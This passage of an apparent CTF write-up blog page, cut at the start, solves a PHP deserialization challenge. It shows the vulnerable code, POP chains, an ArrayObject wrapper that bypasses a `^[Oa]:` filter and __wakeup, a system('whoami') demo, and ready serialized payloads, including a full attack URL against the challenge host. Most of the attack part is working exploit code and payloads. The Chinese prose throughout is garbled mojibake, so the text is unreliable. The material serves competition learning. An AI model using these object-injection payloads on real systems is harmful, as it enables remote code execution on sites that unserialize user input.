class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;é”™äº†å“¥ä»¬,å†è¯•è¯•å§&lt;br&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">her</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$hername</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$asd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;å¥½ç´¯ï¼Œå¥½æƒ³ç¡ä¸€è§‰å•Š&lt;br&gt;&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">serialize</span>(<span class="variable">$this</span>-&gt;asd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">find</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;ä½ èƒ½æ‰¾åˆ°åŠ å¯†ç”¨çš„keyå’Œå¥¹çš„åå­—å—ï¼Ÿqwq&lt;br&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">encode</span>(<span class="variable">$this</span>-&gt;hername,<span class="variable">$this</span>-&gt;key) === <span class="string">&#x27;vxvx&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;è§£å¯†æˆåŠŸï¼&lt;br&gt;&quot;</span>);</span><br><span class="line">            <span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$file</span>) &amp;&amp; (<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>,<span class="string">&#x27;r&#x27;</span>) === <span class="string">&quot;loveyou&quot;</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">echo</span>(<span class="string">&quot;å¿«ç‚¹çš„ï¼Œæ€¥æ€¥æ€¥ï¼ï¼ï¼&lt;br&gt;&quot;</span>);</span><br><span class="line">                <span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>](<span class="variable">$_GET</span>[<span class="string">&#x27;fun&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span>(<span class="string">&quot;çœŸçš„åªå·®ä¸€æ­¥äº†ï¼&lt;br&gt;&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&quot;å…„å¼Ÿæ€ä¹ˆæçš„ï¼Ÿ&lt;br&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">important</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$power</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;ç¡é¥±äº†ï¼Œæ¥ç€æ‰¾ï¼&lt;br&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;power-&gt;seeyou;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">useless</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$seeyou</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$QW</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$YXX</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$seeyou</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;seeyou = <span class="variable">$seeyou</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$characters</span> = <span class="string">&#x27;0123456789&#x27;</span>;</span><br><span class="line">        <span class="variable">$random</span> = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">str_shuffle</span>(<span class="variable">$characters</span>), <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/key\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">if</span>((<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;QW))&lt;<span class="number">80</span> &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;YXX)&lt;<span class="number">80</span>)&#123;</span><br><span class="line">                <span class="variable">$bool</span>=!<span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;QW)&amp;&amp;!<span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;YXX)&amp;&amp;(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;QW) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;YXX)) &amp;&amp; (<span class="variable language_">$this</span>-&gt;QW != <span class="variable language_">$this</span>-&gt;YXX) <span class="keyword">and</span> <span class="variable">$random</span>===<span class="string">&#x27;newbee&#x27;</span>;</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$bool</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span>(<span class="string">&quot;å¿«æ‹¿åˆ°æˆ‘çš„å°ç§˜å¯†äº†&lt;br&gt;&quot;</span>);</span><br><span class="line">                    <span class="variable">$a</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])? <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]: <span class="string">&quot;&quot;</span> ;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/HTTP/i&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">                        <span class="keyword">echo</span> (<span class="title function_ invoke__">basename</span>(<span class="variable">$_SERVER</span>[<span class="variable">$a</span>]));</span><br><span class="line">                        <span class="keyword">echo</span> (<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$_SERVER</span>[<span class="variable">$a</span>])===<span class="string">&#x27;key.php&#x27;</span>)&#123;</span><br><span class="line">                            <span class="keyword">echo</span>(<span class="string">&quot;æ‰¾åˆ°äº†ï¼ä½†å¥½åƒä¸èƒ½ç›´æ¥ä½¿ç”¨ï¼Œæ€ä¹ˆåŠï¼Œæˆ‘å¥½æƒ³å¥¹&lt;br&gt;&quot;</span>);</span><br><span class="line">                            <span class="variable">$file</span> = <span class="string">&quot;key.php&quot;</span>;</span><br><span class="line">                            <span class="title function_ invoke__">readfile</span>(<span class="variable">$file</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="keyword">echo</span>(<span class="string">&quot;ä½ åˆ«è¿™æ ·ï¼Œå¥¹ä¼šç”Ÿæ°”çš„â”­â”®ï¹â”­â”®&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span>(<span class="string">&quot;å°±è¿™ç‚¹èƒ½è€ï¼Ÿæ€ä¹ˆå¸®æˆ‘æ‰¾åˆ°å¥¹(â•¥â•¯^â•°â•¥)&lt;br&gt;&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$good</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;you are good,ä½ å¿«æ‰¾åˆ°æˆ‘çˆ±çš„é‚£ä¸ªå¥¹äº†&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$zhui</span> = <span class="variable language_">$this</span>-&gt;<span class="variable">$good</span>;  </span><br><span class="line">        <span class="variable">$zhui</span>[<span class="variable">$good</span>]();  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^[Oa]:[\d]+/i&quot;</span>, <span class="variable">$user</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="variable">$user</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;ä¸æ˜¯å§ï¼Œç¬¬ä¸€å±‚éƒ½ç»•ä¸è¿‡å»ï¼Ÿï¼Ÿï¼Ÿ&lt;br&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;å¿«å¸®æˆ‘æ‰¾æ‰¾å¥¹ï¼&lt;br&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>è™½ç„¶ä»£ç çœ‹èµ·æ¥æ¯”è¾ƒé•¿ï¼Œä½†æ˜¯è¿˜æ˜¯æ¯”è¾ƒå¥½åˆ†æçš„ï¼Œpopé“¾ä¹Ÿå¾ˆå®¹æ˜“çœ‹å‡ºæ¥ã€‚éœ€è¦ç”¨åˆ°ä¸¤æ¬¡popé“¾ï¼Œç¬¬ä¸€æ¡ç”¨æ¥å¾—åˆ°key.phpçš„å†…å®¹ï¼Œç¬¬äºŒæ¬¡æ‰æ˜¯å¾—åˆ°flag</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">unserialize -&gt; <span class="title function_ invoke__">useless</span>(__destruct) -&gt; <span class="title function_ invoke__">useless</span>(readfile)</span><br><span class="line"></span><br><span class="line">unserialize -&gt; <span class="title function_ invoke__">Me</span>(__wakeup) -&gt;<span class="title function_ invoke__">her</span>(__invoke) -&gt;<span class="title function_ invoke__">important</span>(__sleep) -&gt;<span class="title function_ invoke__">useless</span>(__get) -&gt;<span class="title function_ invoke__">her</span>(find)</span><br></pre></td></tr></table></figure>



<h3 id="Oa-d-i"><a href="#Oa-d-i" class="headerlink" title="&#x2F;^[Oa]:[\d]+&#x2F;i"></a>&#x2F;^[Oa]:[\d]+&#x2F;i</h3><p>ç¬¬ä¸€æ¬¡é‡åˆ°è¿™ç§æƒ…å†µï¼Œå•ç‹¬æ‹¿å‡ºæ¥è®²ä¸€ä¸‹ï¼š</p>
<p>æŒºæ—©ä¹‹å‰æˆ‘å°±çŸ¥é“ä½¿ç”¨Cä»£æ›¿Oèƒ½ç»•è¿‡wakeupï¼Œä½†é‚£æ ·çš„è¯åªèƒ½æ‰§è¡Œconstruct()å‡½æ•°æˆ–è€…destruct()å‡½æ•°ï¼Œæ— æ³•æ·»åŠ ä»»ä½•å†…å®¹ï¼Œè¿™æ¬¡æ¯”èµ›å­¦åˆ°äº†ç§æ–°æ–¹æ³•ï¼Œå°±æ˜¯æŠŠæ­£å¸¸çš„ååºåˆ—åŒ–è¿›è¡Œä¸€æ¬¡æ‰“åŒ…ï¼Œè®©æœ€åç”Ÿæˆçš„payloadä»¥Cå¼€å¤´å³å¯</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;not allowed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;ctfshow);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;1+1&gt;2&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^[Oa]:[\d]+/i&quot;</span>, <span class="variable">$data</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>ä¸èƒ½ç›´æ¥å°†å­—æ¯Oæ”¹æˆå­—æ¯C,è¿™é‡Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ArrayObjectå¯¹æ­£å¸¸çš„ååºåˆ—åŒ–è¿›è¡Œä¸€æ¬¡åŒ…è£…ï¼Œè®©æœ€åè¾“å‡ºçš„payloadä»¥Cå¼€å¤´</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ctfshow</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;not allowed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;OK&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;ctfshow);</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> ctfshow;</span><br><span class="line"><span class="variable">$a</span>-&gt;ctfshow=<span class="string">&quot;whoami&quot;</span>;</span><br><span class="line"><span class="variable">$arr</span>=<span class="keyword">array</span>(<span class="string">&quot;evil&quot;</span>=&gt;<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$oa</span>=<span class="keyword">new</span> <span class="built_in">ArrayObject</span>(<span class="variable">$arr</span>);</span><br><span class="line"><span class="variable">$res</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$oa</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$res</span>;</span><br><span class="line"><span class="comment">//unserialize($res)</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#C:11:&quot;ArrayObject&quot;:77:&#123;x:i:0;a:1:&#123;s:4:&quot;evil&quot;;O:7:&quot;ctfshow&quot;:1:&#123;s:7:&quot;ctfshow&quot;;s:6:&quot;whoami&quot;;&#125;&#125;;m:a:0:&#123;&#125;&#125;</span></span><br></pre></td></tr></table></figure>

<p>7.3.4æ‰å¯ä»¥è¾“å‡ºä»¥Cå¼€å¤´çš„payloadï¼Œæ¢7.4æˆ–è€…8.0è¾“å‡ºçš„å°±æ˜¯Oå¼€å¤´äº†ï¼Œé™¤äº†è¿™ä¸ªå‡½æ•°è¿˜æœ‰å…¶ä»–æ–¹æ³•å¯ä»¥å¯¹payloadè¿›è¡ŒåŒ…è£…</p>
<p>å®ç°äº†unserializeæ¥å£çš„å¤§æ¦‚ç‡æ˜¯Cæ‰“å¤´ï¼Œç»è¿‡æ‰€æœ‰æµ‹è¯•å‘ç°å¯ä»¥ç”¨çš„ç±»ä¸ºï¼š</p>
<ul>
<li>ArrayObject::unserialize</li>
<li>ArrayIterator::unserialize</li>
<li>RecursiveArrayIterator::unserialize</li>
<li>SplObjectStorage::unserialize</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://fushuling.com/index.php/2023/03/11/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%ADwakeup%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/">å‚è€ƒ</a></p>
<h3 id="pop-one"><a href="#pop-one" class="headerlink" title="pop_one"></a>pop_one</h3><p>str_shuffleï¼šéšæœºåœ°æ‰“ä¹±å­—ç¬¦ä¸²ä¸­çš„æ‰€æœ‰å­—ç¬¦</p>
<p>ç”¨åŸç”Ÿç±»ç»•è¿‡md5,andçš„ä¼˜å…ˆçº§è¦ä½äº&#x3D;ï¼Œbasenameç”¨asciiç¼–ç å¤§äº127ç»•è¿‡ï¼Œ$_SERVERæ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œå¯ä»¥è‡ªå·±æ‰“å°çœ‹çœ‹</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">useless</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$QW</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$YXX</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="variable">$cmd</span>=<span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="variable">$cmd</span>);<span class="variable">$b</span> = <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="variable">$cmd</span>,<span class="number">1</span>);</span><br><span class="line"><span class="variable">$tr</span> = <span class="keyword">new</span> <span class="title function_ invoke__">useless</span>();</span><br><span class="line"><span class="variable">$tr</span>-&gt;QW=<span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$tr</span>-&gt;YXX=<span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$arr</span>=<span class="keyword">array</span>(<span class="string">&quot;evil&quot;</span>=&gt;<span class="variable">$tr</span>);</span><br><span class="line"><span class="variable">$oa</span>=<span class="keyword">new</span> <span class="built_in">ArrayObject</span>(<span class="variable">$arr</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>((<span class="variable">$oa</span>)));</span><br><span class="line"></span><br><span class="line"><span class="comment">#https://x64n15yejrv1auhzo7nkm4zct.node.game.sycsec.com/havefun.php/key.php/%ff?user=C%3A11%3A%22ArrayObject%22%3A473%3A%7Bx%3Ai%3A0%3Ba%3A1%3A%7Bs%3A4%3A%22evil%22%3BO%3A7%3A%22useless%22%3A2%3A%7Bs%3A2%3A%22QW%22%3BO%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A1%3A%221%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A8%3A%22E%3A%5Ca.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A9%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7Ds%3A3%3A%22YXX%22%3BO%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A1%3A%221%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A1%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A8%3A%22E%3A%5Ca.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A9%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D%7D%7D%3Bm%3Aa%3A0%3A%7B%7D%7D&amp;a=PHP_SELF</span></span><br></pre></td></tr></table></figure>

<p>æœ€ç»ˆå¾—åˆ°ä¸€æ®µåŠ å¯†çš„æ•°æ®ï¼Œå¤ªé•¿äº†æˆ‘å°±ä¸è´´äº†ï¼Œå°†æ•°æ®base64è§£å¯†ä¿å­˜æˆå›¾ç‰‡,å¾—åˆ°keyå’Œhername</p>
<p><a target="_blank" rel="noopener" href="https://www.ddosi.org/">cyberchef</a></p>
<p><img src="https://cdn.jsdelivr.net/gh/zIxyd/image@main/ctfshow/download.jpg"></p>
<h3 id="pop-two"><a href="#pop-two" class="headerlink" title="pop_two"></a>pop_two</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Me</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$qwe</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$bro</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$secret</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">her</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hername</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$asd</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">important</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$power</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">useless</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$seeyou</span> ;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$QW</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$YXX</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Me</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;bro = &amp;<span class="variable">$a</span>-&gt;secret;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">her</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;qwe = <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">important</span>();</span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">new</span> <span class="title function_ invoke__">useless</span>(<span class="string">&#x27;deadbeef&#x27;</span>);</span><br><span class="line"><span class="comment">// $d-&gt;good=array(&quot;seeyou&quot;=&gt;&quot;phpinfo&quot;) ;</span></span><br><span class="line"><span class="variable">$cc</span> = <span class="keyword">new</span> <span class="title function_ invoke__">her</span>();</span><br><span class="line"><span class="variable">$cc</span>-&gt;key=<span class="number">9</span>;</span><br><span class="line"><span class="variable">$cc</span>-&gt;hername=<span class="string">&quot;momo&quot;</span>;</span><br><span class="line"><span class="variable">$method</span> = [<span class="variable">$cc</span>, <span class="string">&#x27;find&#x27;</span>];</span><br><span class="line"><span class="variable">$d</span>-&gt;seeyou= <span class="keyword">array</span>(<span class="string">&quot;seeyou&quot;</span>=&gt;<span class="variable">$method</span>) ;</span><br><span class="line"><span class="variable">$c</span>-&gt;power = <span class="variable">$d</span>;</span><br><span class="line"><span class="variable">$b</span> -&gt;asd = <span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$arr</span>=<span class="keyword">array</span>(<span class="string">&quot;evil&quot;</span>=&gt;<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$oa</span>=<span class="keyword">new</span> <span class="built_in">ArrayObject</span>(<span class="variable">$arr</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="title function_ invoke__">serialize</span>((<span class="variable">$oa</span>)));</span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line">    </span><br><span class="line"><span class="comment">#C:11:&quot;ArrayObject&quot;:345:&#123;x:i:0;a:1:&#123;s:4:&quot;evil&quot;;O:2:&quot;Me&quot;:3:&#123;s:3:&quot;qwe&quot;;O:3:&quot;her&quot;:3:&#123;s:7:&quot;hername&quot;;N;s:3:&quot;key&quot;;N;s:3:&quot;asd&quot;;O:9:&quot;important&quot;:1:&#123;s:5:&quot;power&quot;;O:7:&quot;useless&quot;:4:&#123;s:6:&quot;seeyou&quot;;a:1:&#123;s:6:&quot;seeyou&quot;;a:2:&#123;i:0;O:3:&quot;her&quot;:3:&#123;s:7:&quot;hername&quot;;s:4:&quot;momo&quot;;s:3:&quot;key&quot;;i:9;s:3:&quot;asd&quot;;N;&#125;i:1;s:4:&quot;find&quot;;&#125;&#125;s:2:&quot;QW&quot;;N;s:3:&quot;YXX&quot;;N;s:4:&quot;good&quot;;N;&#125;&#125;&#125;s:3:&quot;bro&quot;;N;s:6:&quot;secret&quot;;R:20;&#125;&#125;;m:a:0:&#123;&#125;&#125; </span></span><br></pre></td></tr></table></figure>

